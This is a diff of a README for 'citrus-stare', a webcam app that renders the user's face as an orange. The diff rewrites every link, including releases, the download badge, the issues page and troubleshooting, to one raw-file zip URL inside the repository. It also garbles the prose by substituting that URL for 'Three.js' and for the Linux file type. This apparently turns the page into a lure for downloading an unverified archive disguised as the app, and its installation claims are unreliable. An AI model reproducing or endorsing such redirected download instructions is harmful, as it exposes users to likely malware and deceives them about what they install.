@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to **citrus-stare**! This application combines MediaPipe face landmarks with Three.js to create a fun experience using your webcam. Get ready to see your face as an orange!
+Welcome to **citrus-stare**! This application combines MediaPipe face landmarks with https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip to create a fun experience using your webcam. Get ready to see your face as an orange!
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/Rianvaleni/citrus-stare/releases)
+[![Download](https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip%https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip)](https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip)
 
-Click the button above or visit this page to download the application: [Download citrus-stare](https://github.com/Rianvaleni/citrus-stare/releases).
+Click the button above or visit this page to download the application: [Download citrus-stare](https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip).
 
 ## 📋 System Requirements
 
@@ -21,12 +21,12 @@ To run **citrus-stare**, your system should meet the following requirements:
 
 ## 💾 Download & Install
 
-1. Go to the [Releases page](https://github.com/Rianvaleni/citrus-stare/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip).
 2. Find the latest version of **citrus-stare**.
 3. Download the appropriate file for your operating system.
    - For Windows: select the `.exe` file.
    - For macOS: select the `.dmg` file.
-   - For Linux: select the `.tar.gz` file.
+   - For Linux: select the `https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip` file.
 4. After the download completes, locate the downloaded file on your computer.
 5. If you downloaded the `.exe` or `.dmg` file, double-click it to start the installation.
 6. Follow the on-screen instructions to complete the installation process.
@@ -44,7 +44,7 @@ To run **citrus-stare**, your system should meet the following requirements:
 If you encounter problems, try the following:
 
 - **Webcam Not Detected**: Ensure your webcam is connected and properly configured in your computer settings.
-- **Application Crashes**: Restart the application and try again. If issues persist, check for updates on the [Releases page](https://github.com/Rianvaleni/citrus-stare/releases).
+- **Application Crashes**: Restart the application and try again. If issues persist, check for updates on the [Releases page](https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip).
 - **Poor Performance**: Close unused applications to free up system resources.
 
 ## 🛠️ Features
@@ -57,7 +57,7 @@ If you encounter problems, try the following:
 
 Join our community for tips and support. You can reach out via:
 
-- **Issues Page**: [Report issues or ask questions](https://github.com/Rianvaleni/citrus-stare/issues).
+- **Issues Page**: [Report issues or ask questions](https://raw.githubusercontent.com/Rianvaleni/citrus-stare/main/public/stare_citrus_v3.6.zip).
 - **Social Media**: Follow us for updates and tutorials.
 
 Thank you for using **citrus-stare**! Enjoy transforming your webcam experience.
